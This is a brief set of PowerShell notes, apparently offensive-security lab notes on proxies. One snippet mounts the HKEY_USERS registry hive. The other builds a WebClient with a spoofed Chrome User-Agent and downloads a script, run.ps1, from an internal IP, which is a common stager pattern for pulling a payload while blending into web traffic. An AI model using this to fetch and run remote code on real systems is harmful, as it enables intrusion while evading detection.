# Proxies
## Remap reg hive
```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
```

## Change UA of webclient
```
$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36")
$wc.DownloadString("http://192.168.119.120/run.ps1")
```
